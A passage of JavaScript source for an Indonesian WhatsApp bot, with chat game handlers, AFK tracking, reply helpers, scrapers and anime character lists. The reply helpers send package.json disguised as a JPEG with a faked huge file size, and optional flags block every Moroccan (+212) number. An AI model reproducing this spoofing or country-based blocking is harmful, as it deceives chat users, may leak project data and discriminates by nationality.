	    0: 'Posisi Tidak Valid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room13.game.winner) isWin = true
	    else if (room13.game.board === 511) isTie = true
	    let arr = room13.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room13.game._currentTurn = m.sender === room13.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room13.game.currentTurn : room13.game.winner
	    let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`}
❌: @${room13.game.playerX.split('@')[0]}
⭕: @${room13.game.playerO.split('@')[0]}

Ketik *surrender* untuk menyerah dan mengaku kalah`
	    if ((room13.game._currentTurn ^ isSurrender ? room13.x : room13.o) !== m.chat)
	    room13[room13.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room13.x !== room13.o) await alya.sendText(room13.x, str, m, { mentions: parseMention(str) } )
	    await alya.sendText(room13.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room13.id]
	    }
	    }


        
        
        
        this.caturGame = this.caturGame || {};
        const caturSession = Object.values(this.caturGame).find(g =>
          g.state === 'PLAYING' && (g.playerW === m.sender || g.playerB === m.sender)
        );
        if (caturSession) {
          const { parseMove, isValidBasicMove, applyMove, isKingDead, renderBoard } = require('./lib/catur');
          const isMySurrender = /^menyerah$/i.test(m.text.trim());
          const myColor = caturSession.playerW === m.sender ? 'w' : 'b';
          const oppColor = myColor === 'w' ? 'b' : 'w';
          const myTurn = caturSession.turn === myColor;

          if (isMySurrender) {
            const oppJid = myColor === 'w' ? caturSession.playerB : caturSession.playerW;
            await alya.sendMessage(caturSession.chat, {
              text: `🏳️ @${m.sender.split('@')[0]} *menyerah!*\n\n🏆 Pemenang: @${oppJid.split('@')[0]}!\n\n♟️ Game catur selesai.`,
              mentions: [m.sender, oppJid]
            });
            caturSession.state = 'ENDED';
            delete this.caturGame[caturSession.id];
            return true;
          }

          if (!myTurn) return true; 

          const move = parseMove(m.text.trim());
          if (!move) return true; 

          const valid = isValidBasicMove(caturSession.board, move, myColor);
          if (!valid.ok) {
            await alya.sendMessage(caturSession.chat, {
              text: `❌ Langkah tidak valid: ${valid.reason}\nCoba lagi, format: *e2e4*`,
              mentions: [m.sender]
            });
            return true;
          }

          caturSession.board = applyMove(caturSession.board, move);
          caturSession.lastMove = move.raw;
          caturSession.moveCount++;
          caturSession.turn = oppColor;

          const oppJid = myColor === 'w' ? caturSession.playerB : caturSession.playerW;

          if (isKingDead(caturSession.board, oppColor)) {
            const board = renderBoard(caturSession.board, move.raw);
            await alya.sendMessage(caturSession.chat, {
              text: `${board}\n\n♛ *SKAK MAT!*\n\n🏆 @${m.sender.split('@')[0]} *MENANG!*\n@${oppJid.split('@')[0]} Raja kamu mati.\n\n♟️ Total langkah: ${caturSession.moveCount}`,
              mentions: [m.sender, oppJid]
            });
            caturSession.state = 'ENDED';
            delete this.caturGame[caturSession.id];
            return true;
          }

          const board = renderBoard(caturSession.board, move.raw);
          const nextPlayer = oppColor === 'w' ? caturSession.playerW : caturSession.playerB;
          await alya.sendMessage(caturSession.chat, {
            text: `${board}\n\n@${m.sender.split('@')[0]} gerak: *${move.raw}*\n\n🎯 Giliran: @${nextPlayer.split('@')[0]} (${oppColor === 'w' ? '♔ Putih' : '♚ Hitam'})\nFormat: *e2e4* | Ketik *menyerah* untuk menyerah`,
            mentions: [m.sender, nextPlayer]
          });
          return true;
        }

        
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    alya.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    
	    alya.sendText(m.chat, `Jas telah dikirim ke obrolan

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing-masing"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) alya.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) alya.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) alya.sendText(m.chat, `Kedua Pemain Tidak Ingin Bermain,\nSuit Dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    alya.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Tidak Memilih Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /Gunting/i
	    let b = /Batu/i
	    let k = /Kertas/i
	    let reg = /^(Gunting|Batu|Kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\n Menunggu lawan untuk memilih` : ''}`)
	    if (!roof.pilih2) alya.sendText(roof.p2, '_Lawan telah memilih\kSekarang giliranmu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\n Menunggu lawan untuk memilih` : ''}`)
	    if (!roof.pilih) alya.sendText(roof.p, '_ Lawan telah memilih\kSekarang giliranmu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    alya.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } 
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
if (db.users[m.sender].afkTime > -1) {
    let user = global.db.users[m.sender]

    m.reply(
`✅ *Kamu berhenti AFK!*  

👤 ${m.pushName} kembali aktif.  
💤 Alasan sebelumnya : ${user.afkReason ? user.afkReason : '-'}  
⏳ Durasi AFK : ${clockString(new Date - user.afkTime)}

─────────────────────
💡 Selamat datang kembali! Selamat beraktifitas.
`.trim())

    user.afkTime = -1
    user.afkReason = ''
}

		
	if (db.settings[botNumber].autobio) {
	    let setting = global.db.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await alya.updateProfileStatus(`${alya.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}


if (global.autoblockmorroco) {
if (m.sender.startsWith('212')) return alya.updateBlockStatus(m.sender, 'block')
}


if (global.autokickmorroco) {
if (m.isGroup && m.sender.startsWith('212')) return 
}


















 
async function groupStatus(jid, content) {
  const { backgroundColor } = content;
  delete content.backgroundColor;
  const inside = await baileys.generateWAMessageContent(content, {
    upload: alya.waUploadToServer,
    backgroundColor
  });
  const messageSecret = crypto.randomBytes(32);
  const m = baileys.generateWAMessageFromContent(jid, {
    messageContextInfo: {
      messageSecret
    },
    groupStatusMessageV2: {
      message: {
        ...inside,
        messageContextInfo: {
          messageSecret
        }
      }
    }
  }, {});
  await alya.relayMessage(jid, m.message, {
    messageId: m.key.id
  });
  return m;
}

async function sendalyaMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await alya.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

















const _fsMeta   = require('fs')
const _pathMeta = require('path')

function _readPkgMeta() {
  try { return _fsMeta.readFileSync(_pathMeta.join(process.cwd(), 'package.json')) }
  catch { return Buffer.from('{}') }
}

const replyalya = async (teks) => {
  if (isMediaPayload(teks)) {
    return alya.sendMessage(m.chat, teks, { quoted: m })
  }
  const txt      = typeof teks === 'string' ? teks : String(teks)
  const botLabel = global.botname || 'Alya Bot'

  
  const cardThumb = resolveCardThumb(null, null)

  if (cardThumb) {
    await alya.sendMessage(m.chat, {
      document:      _readPkgMeta(),
      mimetype:      'image/jpeg',
      fileName:      botLabel,
      fileLength:    99999999999999,
      jpegThumbnail: cardThumb,
      caption:       txt,
      mentions:      [m?.sender].filter(Boolean),
      contextInfo:   buildOurinSenderCtx(botLabel), 
    }, { quoted: m })   
  } else {
    await alya.sendMessage(m.chat, { text: txt }, { quoted: m })
  }
}

const replytolak = async (teks) => {
  if (isMediaPayload(teks)) {
    return alya.sendMessage(m.chat, teks, { quoted: m })
  }
  const txt      = typeof teks === 'string' ? teks : String(teks)
  const botLabel = global.botname || 'Alya Bot'

  const cardThumb = resolveCardThumb(null, null)

  if (cardThumb) {
    await alya.sendMessage(m.chat, {
      document:      _readPkgMeta(),
      mimetype:      'image/jpeg',
      fileName:      botLabel,
      fileLength:    99999999999999,
      jpegThumbnail: cardThumb,
      caption:       txt,
      mentions:      [m?.sender].filter(Boolean),
      contextInfo:   buildOurinSenderCtx(botLabel), 
    }, { quoted: m })
  } else {
    await alya.sendMessage(m.chat, { text: txt }, { quoted: m })
  }
}



const reply = async (teks) => {
  const txt = typeof teks === 'string' ? teks : String(teks)
  await alya.sendMessage(from, { text: txt }, { quoted: m })
}
const isUrl = (url) => {
    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}
function msToDate(mse) {
    let temp = mse;
    let days = Math.floor(mse / (24 * 60 * 60 * 1000));
    let daysms = mse % (24 * 60 * 60 * 1000);
    let hours = Math.floor(daysms / (60 * 60 * 1000));
    let hoursms = mse % (60 * 60 * 1000);
    let minutes = Math.floor(hoursms / (60 * 1000));
    let minutesms = mse % (60 * 1000);
    let sec = Math.floor(minutesms / 1000);

    return `${days} Days ${hours} Hours ${minutes} Minutes`;
}

async function getGcName(groupID) {
            try {
                let data_name = await alya.groupMetadata(groupID)
                return data_name.subject
            } catch (err) {
                return '-'
            }
        }

async function alyaytdl(link) {
    try {
        const response = await axios.get('https://y2ts.us.kg/token');
        const token = response.data.token;
        if (process.env.NODE_ENV !== 'production') console.log('Token:', token);
        const url = `https://y2ts.us.kg/youtube?url=${link}`;
        const headers = {
            'Authorization-Token': token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
            'Content-Type': 'application/json'
        };
const videoResponse = await axios.get(url, { headers });
        if (videoResponse.data.status) {
            const result = videoResponse.data.result || '';
            if (process.env.NODE_ENV !== 'production') console.log('Title:', result.title || '');
            if (process.env.NODE_ENV !== 'production') console.log('Description:', result.description || '');
            if (process.env.NODE_ENV !== 'production') console.log('Views:', result.views || '');
            if (process.env.NODE_ENV !== 'production') console.log('MP3 URL:', result.mp3 || '');
            if (process.env.NODE_ENV !== 'production') console.log('MP4 URL:', result.mp4 || '');
            return result;
        } else {
            if (process.env.NODE_ENV !== 'production') console.log('Status is false, no result found.');
        }
        
    } catch (error) {
        console.error('Error occurred:', error.message);
        if (error.response) {
            console.error('Response status:', error.response.status);
        }
    }
}
const waifuList = [
    
    { name: "Aira Shiratori", anime: "Dandadan", rarity: "COMMON" },
    { name: "Utena Hiiragi", anime: "Mahou Shoujo ni Akogarete", rarity: "COMMON" },
    { name: "Kana Ichinose", anime: "Makeine: Too Many Losing Heroines!", rarity: "COMMON" },
    { name: "Lemon Yakishio", anime: "Makeine: Too Many Losing Heroines!", rarity: "COMMON" },
    { name: "Chika Komari", anime: "Makeine: Too Many Losing Heroines!", rarity: "COMMON" },
    { name: "Elianna Bernstein", anime: "Mushikaburi-hime", rarity: "COMMON" },
    { name: "Saya Kisaragi", anime: "Tasogare Otome x Amnesia", rarity: "COMMON" },
    { name: "Nanami Mami", anime: "Kanojo, Okarishimasu", rarity: "COMMON" },
    { name: "Ruka Sarashina", anime: "Kanojo, Okarishimasu", rarity: "COMMON" },
    { name: "Sumi Sakurasawa", anime: "Kanojo, Okarishimasu", rarity: "COMMON" },
    { name: "Nadeshiko Kagamihara", anime: "Yuru Camp△ S3", rarity: "COMMON" },
    { name: "Rin Shima", anime: "Yuru Camp△ S3", rarity: "COMMON" },
    { name: "Hitori Gotou \"Bocchi\"", anime: "Bocchi the Rock!", rarity: "COMMON" },
    { name: "Ikuyo Kita", anime: "Bocchi the Rock!", rarity: "COMMON" },
    { name: "Ryo Yamada", anime: "Bocchi the Rock!", rarity: "COMMON" },
    { name: "Nijika Ijichi", anime: "Bocchi the Rock!", rarity: "COMMON" },
    { name: "Najimi Osana", anime: "Komi-san wa, Komyushou desu", rarity: "COMMON" },
    { name: "Fiona Frost", anime: "Spy x Family Season 2", rarity: "COMMON" },
    { name: "Lycoris", anime: "Lycoris Recoil", rarity: "COMMON" },
    { name: "Vermeil", anime: "Kinsou no Vermeil", rarity: "COMMON" },
    
    { name: "Anna Yamada", anime: "Boku no Kokoro no Yabai Yatsu S2", rarity: "EPIC" },
    { name: "Marcille Donato", anime: "Dungeon Meshi", rarity: "EPIC" },
    { name: "Falin Touden", anime: "Dungeon Meshi", rarity: "EPIC" },
    { name: "Senshi", anime: "Dungeon Meshi", rarity: "EPIC" },
    { name: "Jinshi", anime: "Kusuriya no Hitorigoto S2", rarity: "EPIC" },
    { name: "Kiyoka Kudou", anime: "Watashi no Shiawase na Kekkon S2", rarity: "EPIC" },
    { name: "Shoko Komi", anime: "Komi-san wa, Komyushou desu", rarity: "EPIC" },
    { name: "Chisato Nishikigi", anime: "Lycoris Recoil", rarity: "EPIC" },
    { name: "Takina Inoue", anime: "Lycoris Recoil", rarity: "EPIC" },
    { name: "Suzume Iwato", anime: "Suzume no Tojimari", rarity: "EPIC" },
    { name: "Marin Kitagawa", anime: "Sono Bisque Doll wa Koi wo Suru S2", rarity: "EPIC" },
    { name: "Sajuna Inui", anime: "Sono Bisque Doll wa Koi wo Suru S2", rarity: "EPIC" },
    { name: "Lilia Kudelfeyt", anime: "Vermeil in Gold", rarity: "EPIC" },
    { name: "Akane Kurokawa", anime: "Oshi no Ko S2", rarity: "EPIC" },
    { name: "Mem-cho", anime: "Oshi no Ko S2", rarity: "EPIC" },
    { name: "Mitsuri Kanroji", anime: "Kimetsu no Yaiba: Hashira Geiko-hen", rarity: "EPIC" },
    { name: "Miyo Saimori", anime: "Watashi no Shiawase na Kekkon S2", rarity: "EPIC" },
    { name: "Momo Ayase", anime: "Dandadan", rarity: "EPIC" },
    { name: "Arima Kana", anime: "Oshi no Ko S2", rarity: "EPIC" },
    { name: "Ruby Hoshino", anime: "Oshi no Ko S2", rarity: "EPIC" },
    
    { name: "Nobara Kugisaki", anime: "Jujutsu Kaisen S2", rarity: "LEGENDARY" },
    { name: "Maki Zenin", anime: "Jujutsu Kaisen S2", rarity: "LEGENDARY" },
    { name: "Shoko Ieiri", anime: "Jujutsu Kaisen S2", rarity: "LEGENDARY" },
    { name: "Mei Mei", anime: "Jujutsu Kaisen S2", rarity: "LEGENDARY" },
    { name: "Utahime Iori", anime: "Jujutsu Kaisen S2", rarity: "LEGENDARY" },
    { name: "Rika Orimoto", anime: "Jujutsu Kaisen 0", rarity: "LEGENDARY" },
    { name: "Nezuko Kamado", anime: "Kimetsu no Yaiba: Swordsmith Village", rarity: "LEGENDARY" },
    { name: "Shinobu Kocho", anime: "Kimetsu no Yaiba", rarity: "LEGENDARY" },
    { name: "Kanao Tsuyuri", anime: "Kimetsu no Yaiba", rarity: "LEGENDARY" },
    { name: "Daki", anime: "Kimetsu no Yaiba: Yuukaku-hen", rarity: "LEGENDARY" },
    { name: "Himeno", anime: "Chainsaw Man", rarity: "LEGENDARY" },
    { name: "Kobeni Higashiyama", anime: "Chainsaw Man", rarity: "LEGENDARY" },
    { name: "Reze", anime: "Chainsaw Man Movie", rarity: "LEGENDARY" },
    { name: "Nico Robin", anime: "One Piece: Egghead", rarity: "LEGENDARY" },
    { name: "Boa Hancock", anime: "One Piece", rarity: "LEGENDARY" },
    { name: "Yamato", anime: "One Piece: Wano", rarity: "LEGENDARY" },
    { name: "Uta", anime: "One Piece Film Red", rarity: "LEGENDARY" },
    { name: "Kaguya Shinomiya", anime: "Kaguya-sama: Love is War S3 + Movie", rarity: "LEGENDARY" },
    { name: "Hayasaka Ai", anime: "Kaguya-sama: Love is War", rarity: "LEGENDARY" },
    { name: "Chika Fujiwara", anime: "Kaguya-sama: Love is War", rarity: "LEGENDARY" },
    { name: "Rem", anime: "Re:Zero S3", rarity: "LEGENDARY" },
    { name: "Emilia", anime: "Re:Zero S3", rarity: "LEGENDARY" },
    { name: "Echidna", anime: "Re:Zero", rarity: "LEGENDARY" },
    { name: "Beatrice", anime: "Re:Zero", rarity: "LEGENDARY" },
    { name: "Violet Evergarden", anime: "Violet Evergarden Movie", rarity: "LEGENDARY" },
    
    { name: "Mahiru Shiina", anime: "Otonari no Tenshi-sama", rarity: "MITOS" },
    { name: "Yuki Suou", anime: "Roshidere", rarity: "MITOS" },
    { name: "Alisa Mikhailovna Kujou", anime: "Roshidere", rarity: "MITOS" },
    { name: "Frieren", anime: "Sousou no Frieren", rarity: "MITOS" },
    { name: "Fern", anime: "Sousou no Frieren", rarity: "MITOS" },
    { name: "Ubel", anime: "Sousou no Frieren", rarity: "MITOS" },
    { name: "Aura", anime: "Sousou no Frieren", rarity: "MITOS" },
    { name: "Sense", anime: "Sousou no Frieren", rarity: "MITOS" },
    { name: "Ai Hoshino", anime: "Oshi no Ko", rarity: "MITOS" },
    { name: "Makima", anime: "Chainsaw Man", rarity: "MITOS" },
    { name: "Power", anime: "Chainsaw Man", rarity: "MITOS" },
    { name: "Asa Mitaka", anime: "Chainsaw Man Part 2", rarity: "MITOS" },
    { name: "Maomao", anime: "Kusuriya no Hitorigoto S1+S2", rarity: "MITOS" },
    { name: "Acrobatic Silky", anime: "Dandadan", rarity: "MITOS" },
    { name: "Anya Forger", anime: "Spy x Family Movie: Code White", rarity: "MITOS" },
    { name: "Yor Forger", anime: "Spy x Family", rarity: "MITOS" },
    { name: "Suletta Mercury", anime: "Gundam: Witch from Mercury S2", rarity: "MITOS" },
    { name: "Miorine Rembran", anime: "Gundam: Witch from Mercury S2", rarity: "MITOS" },
    { name: "Nika Nanaura", anime: "Gundam: Witch from Mercury", rarity: "MITOS" },
    { name: "Zero Two", anime: "Darling in the Franxx", rarity: "MITOS" },
    { name: "Asuka Langley Soryu", anime: "Evangelion", rarity: "MITOS" },
    { name: "Rei Ayanami", anime: "Evangelion", rarity: "MITOS" },
    { name: "Mikasa Ackerman", anime: "Shingeki no Kyojin Final Season", rarity: "MITOS" },
    { name: "Historia Reiss", anime: "Shingeki no Kyojin Final Season", rarity: "MITOS" }
]
const husbuList = [
    
    { name: "Kageyama Tobio", anime: "Haikyuu!!", rarity: "COMMON" },
    { name: "Kurosaki Ichigo", anime: "Bleach", rarity: "COMMON" },
    { name: "Natsu Dragneel", anime: "Fairy Tail", rarity: "COMMON" },
    { name: "Kirishima Eijirou", anime: "Boku no Hero Academia", rarity: "COMMON" },
    { name: "Yukihira Souma", anime: "Shokugeki no Souma", rarity: "COMMON" },
    { name: "Tanaka Ryuunosuke", anime: "Haikyuu!!", rarity: "COMMON" },
    { name: "Asta", anime: "Black Clover", rarity: "COMMON" },
    { name: "Hinata Shoyo", anime: "Haikyuu!!", rarity: "COMMON" },
    { name: "Okumura Rin", anime: "Ao no Exorcist", rarity: "COMMON" },
    { name: "Veldora Tempest", anime: "Tensei shitara Slime Datta Ken", rarity: "COMMON" },
    { name: "Miya Atsumu", anime: "Haikyuu!!", rarity: "COMMON" },
    { name: "Miya Osamu", anime: "Haikyuu!!", rarity: "COMMON" },
    { name: "Kageyama Shigeo", anime: "Mob Psycho 100", rarity: "COMMON" },
    { name: "Reigen Arataka", anime: "Mob Psycho 100", rarity: "COMMON" },
    { name: "Kyoji Shinkawa", anime: "Sword Art Online", rarity: "COMMON" },
    { name: "Eugeo", anime: "Sword Art Online: Alicization", rarity: "COMMON" },
    { name: "Zen Wistaria", anime: "Akagami no Shirayuki-hime", rarity: "COMMON" },
    { name: "Obi", anime: "Akagami no Shirayuki-hime", rarity: "COMMON" },
    { name: "Haru Yoshida", anime: "Tonari no Kaibutsu-kun", rarity: "COMMON" },
    { name: "Takeo Gouda", anime: "Ore Monogatari!!", rarity: "COMMON" },
    
    { name: "Tomioka Giyu", anime: "Kimetsu no Yaiba", rarity: "EPIC" },
    { name: "Zoro Roronoa", anime: "One Piece", rarity: "EPIC" },
    { name: "Bakugo Katsuki", anime: "Boku no Hero Academia", rarity: "EPIC" },
    { name: "Killua Zoldyck", anime: "Hunter x Hunter", rarity: "EPIC" },
    { name: "Sano Manjirou", anime: "Tokyo Revengers", rarity: "EPIC" },
    { name: "Todoroki Shoto", anime: "Boku no Hero Academia", rarity: "EPIC" },
    { name: "Loid Forger", anime: "Spy x Family", rarity: "EPIC" },
    { name: "Nanami Kento", anime: "Jujutsu Kaisen", rarity: "EPIC" },
    { name: "Hawks", anime: "Boku no Hero Academia", rarity: "EPIC" },
    { name: "Osamu Dazai", anime: "Bungou Stray Dogs", rarity: "EPIC" },
    { name: "Karma Akabane", anime: "Ansatsu Kyoushitsu", rarity: "EPIC" },
    { name: "Sakusa Kiyoomi", anime: "Haikyuu!!", rarity: "EPIC" },
    { name: "Rengoku Kyojuro", anime: "Kimetsu no Yaiba", rarity: "EPIC" },
    { name: "Howl", anime: "Howl no Ugoku Shiro", rarity: "EPIC" },
    { name: "Yato", anime: "Noragami", rarity: "EPIC" },
    { name: "Saiki Kusuo", anime: "Saiki Kusuo no Psi-nan", rarity: "EPIC" },
    { name: "Shin-Ah", anime: "Akatsuki no Yona", rarity: "EPIC" },
    { name: "Hak", anime: "Akatsuki no Yona", rarity: "EPIC" },
    { name: "Tamaki Suoh", anime: "Ouran High School Host Club", rarity: "EPIC" },
    { name: "Kyoya Ootori", anime: "Ouran High School Host Club", rarity: "EPIC" },
    { name: "Atsushi Nakajima", anime: "Bungou Stray Dogs", rarity: "EPIC" },
    { name: "Chuuya Nakahara", anime: "Bungou Stray Dogs", rarity: "EPIC" },
    { name: "Ranpo Edogawa", anime: "Bungou Stray Dogs", rarity: "EPIC" },
    { name: "Fushiguro Megumi", anime: "Jujutsu Kaisen", rarity: "EPIC" },
    { name: "Inumaki Toge", anime: "Jujutsu Kaisen", rarity: "EPIC" },
    { name: "Geto Suguru", anime: "Jujutsu Kaisen 0", rarity: "EPIC" },
    { name: "Inosuke Hashibira", anime: "Kimetsu no Yaiba", rarity: "EPIC" },
    { name: "Uzui Tengen", anime: "Kimetsu no Yaiba", rarity: "EPIC" },
    { name: "Sanemi Shinazugawa", anime: "Kimetsu no Yaiba", rarity: "EPIC" },
    { name: "Sabito", anime: "Kimetsu no Yaiba", rarity: "EPIC" },
    
    { name: "Levi Ackerman", anime: "Shingeki no Kyojin", rarity: "LEGENDARY" },
    { name: "Gojo Satoru", anime: "Jujutsu Kaisen", rarity: "LEGENDARY" },
    { name: "Kakashi Hatake", anime: "Naruto", rarity: "LEGENDARY" },
    { name: "Itachi Uchiha", anime: "Naruto", rarity: "LEGENDARY" },
    { name: "L Lawliet", anime: "Death Note", rarity: "LEGENDARY" },
    { name: "Sebastian Michaelis", anime: "Kuroshitsuji", rarity: "LEGENDARY" },
    { name: "Kyo Sohma", anime: "Fruits Basket", rarity: "LEGENDARY" },
    { name: "Sesshomaru", anime: "Inuyasha", rarity: "LEGENDARY" },
    { name: "Zeref Dragneel", anime: "Fairy Tail", rarity: "LEGENDARY" },
    { name: "Sakata Gintoki", anime: "Gintama", rarity: "LEGENDARY" },
    { name: "Law Trafalgar", anime: "One Piece", rarity: "LEGENDARY" },
    { name: "Portgas D. Ace", anime: "One Piece", rarity: "LEGENDARY" },
    { name: "Armin Arlert", anime: "Shingeki no Kyojin", rarity: "LEGENDARY" },
    { name: "Tomoe", anime: "Kamisama Hajimemashita", rarity: "LEGENDARY" },
    { name: "Sanji Vinsmoke", anime: "One Piece", rarity: "LEGENDARY" },
    { name: "Shanks", anime: "One Piece", rarity: "LEGENDARY" },
    { name: "Marco", anime: "One Piece", rarity: "LEGENDARY" },
    { name: "Kisuke Urahara", anime: "Bleach", rarity: "LEGENDARY" },
    { name: "Grimmjow Jaegerjaquez", anime: "Bleach", rarity: "LEGENDARY" },
    { name: "Byakuya Kuchiki", anime: "Bleach", rarity: "LEGENDARY" },
    { name: "Gaara", anime: "Naruto", rarity: "LEGENDARY" },
    { name: "Neji Hyuga", anime: "Naruto", rarity: "LEGENDARY" },
    { name: "Minato Namikaze", anime: "Naruto", rarity: "LEGENDARY" },
    { name: "Shikamaru Nara", anime: "Naruto", rarity: "LEGENDARY" },
    { name: "Edward Elric", anime: "Fullmetal Alchemist: Brotherhood", rarity: "LEGENDARY" },
    { name: "Greed / Ling Yao", anime: "Fullmetal Alchemist: Brotherhood", rarity: "LEGENDARY" },
    { name: "Spike Spiegel", anime: "Cowboy Bebop", rarity: "LEGENDARY" },
    { name: "Guts", anime: "Berserk", rarity: "LEGENDARY" },
    { name: "Griffith", anime: "Berserk", rarity: "LEGENDARY" },
    
    { name: "Sasuke Uchiha", anime: "Naruto", rarity: "MITOS" },
    { name: "Uchiha Madara", anime: "Naruto", rarity: "MITOS" },
    { name: "Vegeta", anime: "Dragon Ball Z", rarity: "MITOS" },
    { name: "Usui Takumi", anime: "Kaichou wa Maid-sama!", rarity: "MITOS" },
    { name: "Kurama", anime: "Yu Yu Hakusho", rarity: "MITOS" },
    { name: "Kenshin Himura", anime: "Rurouni Kenshin", rarity: "MITOS" },
    { name: "Roy Mustang", anime: "Fullmetal Alchemist: Brotherhood", rarity: "MITOS" },
    { name: "Light Yagami", anime: "Death Note", rarity: "MITOS" },
    { name: "Lelouch vi Britannia", anime: "Code Geass", rarity: "MITOS" },
    { name: "Suguru Geto", anime: "Jujutsu Kaisen", rarity: "MITOS" },
    { name: "Haku", anime: "Spirited Away", rarity: "MITOS" },
    { name: "Koyomi Araragi", anime: "Monogatari Series", rarity: "MITOS" },
    { name: "Kyon", anime: "Suzumiya Haruhi no Yuuutsu", rarity: "MITOS" },
    { name: "Tachibana Taki", anime: "Kimi no Na wa", rarity: "MITOS" },
    { name: "Ainz Ooal Gown", anime: "Overlord", rarity: "MITOS" },
    { name: "Diablo", anime: "How Not to Summon a Demon Lord", rarity: "MITOS" },
    { name: "Rimuru Tempest", anime: "Tensei shitara Slime Datta Ken", rarity: "MITOS" },
    { name: "Ciel Phantomhive", anime: "Kuroshitsuji", rarity: "MITOS" },
    { name: "Ichigo Kurosaki", anime: "Bleach", rarity: "MITOS" },
    { name: "Sung Jin-Woo", anime: "Solo Leveling", rarity: "MITOS" }
]

async function BingAlya(text) {
  const axios = require('axios');
  const cheerio = require('cheerio');
  const BASE_URL = "https://www.texttoimage.org";
  const headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    Origin: "https://www.texttoimage.org",
    Referer: "https://www.texttoimage.org/",
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
  };
  async function text2img(prompt) {
    if (!prompt) return { status: false, result: "Where is the prompt param?" };
    try {
      let q = new URLSearchParams({ prompt });
      let { data } = await axios.post(`${BASE_URL}/generate`, q, { headers });
      let html = await axios.get(`${BASE_URL}/${data.url}`, { headers });
      const $ = cheerio.load(html.data);
      let result = BASE_URL + $(".image-container").find("img").attr("src");
      return { status: true, result };
    } catch (e) {
